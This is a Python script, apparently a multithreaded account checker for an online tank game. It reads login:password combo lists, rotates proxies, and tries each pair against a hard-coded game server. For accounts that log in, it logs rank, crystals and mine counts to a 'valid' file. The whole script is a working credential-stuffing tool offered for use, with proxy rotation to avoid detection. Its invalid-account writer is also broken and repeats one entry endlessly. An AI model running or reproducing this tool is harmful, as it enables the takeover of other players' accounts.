from proxyclient import ProxyClient
import coloredlogs, logging
from time import sleep
from queue import Queue
import utils
from threading import Thread

coloredlogs.install(level='info', fmt='%(asctime)s [%(levelname)s] %(message)s')

rangs = ["Новобранец","Рядовой","Ефрейтор","Капрал","Мастер-капрал","Сержант","Штаб-сержант","Мастер-сержант","Первый сержант","Сержант-майор","Уорэнт-офицер 1","Уорэнт-офицер 2","Уорэнт-офицер 3","Уорэнт-офицер 4","Уорэнт-офицер 5","Младший лейтенант","Лейтенант","Старший лейтенант","Капитан","Майор","Подполковник","Полковник","Бригадир","Генерал-майор","Генерал-лейтенант","Генерал","Маршал","Фельдмаршал","Командор","Генералиссимус"]

all_accounts = Queue()
proxy_queue = Queue()
valid = Queue()
invalid = Queue()

def check_thread():
    while not all_accounts.empty():
        account = all_accounts.get()
        proxy = proxy_queue.get()
        client = ProxyClient("135.125.188.169", 6969, proxy)
        try:
            login, password = account.split(':')
        except:
            continue
        try:
            client.handshake()
            sleep(3)
            client.load_resources()
            result = client.auth(login, password)
            if result:
                rang = rangs[result['rang'] - 1]
                crystalls = result['crystall']
                sleep(3)
                garage = client.get_garage_data()
                mines = utils.get_item_by_id(garage, "mine")["count"]
                valid.put(f"{account}|{rang}, crystalls - {crystalls}, mines - {mines}")
                logging.info(f"Valid: {account} - {rang}, remain {all_accounts.qsize()}")
            else:
                invalid.put(account)
                logging.error(f"Invalid: {account}, remain {all_accounts.qsize()}")
        except:
            all_accounts.put(account)
        finally:
            proxy_queue.put(proxy)
            client.disconnect()

def write_valid():
    while True:
        account = valid.get()
        try:
            with open('valid.txt', '+a') as f:
                f.write(account + "\n")
        except:
            valid.put(account)

def write_invalid():
    account = invalid.get()
    while True:
        try:
            with open('invalid.txt', '+a') as f:
                f.write(account + "\n")
        except:
            invalid.put(account)

accounts = utils.read_file("all_accs.txt")
for acc in accounts:
    all_accounts.put(acc)
proxies = utils.read_file("proxy.txt")
Thread(target=write_valid).start()
Thread(target=write_invalid).start()
for proxy in proxies:
    proxy_queue.put(proxy)
threads = 8
for _ in range(threads):
    Thread(target=check_thread).start()
input()

